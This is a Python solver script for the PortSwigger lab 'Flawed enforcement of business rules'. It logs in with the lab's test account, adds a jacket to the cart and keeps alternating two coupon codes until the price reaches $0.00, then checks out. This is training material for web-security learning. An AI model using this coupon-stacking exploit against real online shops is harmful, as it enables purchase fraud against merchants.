#!/usr/bin/env python3
# Lab: Flawed enforcement of business rules
# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    result = soup.find('input', attrs={'name': 'csrf'})['value']
    return result


def login(client, host):
    url = f'{host}/login'
    data = {'csrf': get_csrf_token(client.get(url).text),
            'username': 'wiener',
            'password': 'peter'}
    res = client.post(url, data=data)
    return f'Your username is: wiener' in res.text


def get_details(text):
    soup = BeautifulSoup(text, 'html.parser')
    jacket = soup.find('img', attrs={'src': '/image/productcatalog/specialproducts/LeetLeatherJacket.jpg'})
    ret = {}
    ret['jacket'] = {'price': jacket.parent.contents[6].strip().lstrip('$'),
                     'name': jacket.find_next_sibling('h3').text,
                     'product_id': jacket.find_next_sibling('a')['href'].split('=')[1]}
    return ret


def add_to_cart(client, url, item, amount):
    data = {'productId': item['product_id'],
            'quantity': amount,
            'redir': 'CART'}
    client.post(url, data=data, allow_redirects=False)


def apply_discounts(client, url):
    csrf = get_csrf_token(client.get(url).text)
    tokens = ['SIGNUP30', 'NEWCUST5']
    i = 0
    while True:
        data = {'csrf': csrf,
                'coupon': tokens[i % 2]}
        r = client.post(f'{url}/coupon', data=data)
        text = r.text
        if '$0.00' in text:
            break
        csrf = get_csrf_token(text)
        i += 1


def purchase(client, url):
    csrf = get_csrf_token(client.get(url).text)
    data = {'csrf': csrf}
    r = client.post(f'{url}/checkout', data=data, allow_redirects=False)
    r = client.get(f'{url}/order-confirmation?order-confirmed=true')
    return 'Congratulations, you solved the lab!' in r.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    if not login(client, host):
        print(f'[-] Failed to login')
        sys.exit(-2)
    print(f'[+] Logged in as wiener')

    details = get_details(client.get(host).text)
    print(f'[+] Adding jacket to cart ')
    add_to_cart(client, f'{host}/cart', details['jacket'], 1)

    print(f'[+] Apply discounts')
    apply_discounts(client, f'{host}/cart')
    print(f'[+] Discounts applied')

    print(f'[+] Attempting purchase')
    if purchase(client, f'{host}/cart'):
        print(f'[+] Purchase successful, enjoy the jacket, lab solved')
    else:
        print(f'[-] Purchase failed')



if __name__ == "__main__":
    main()
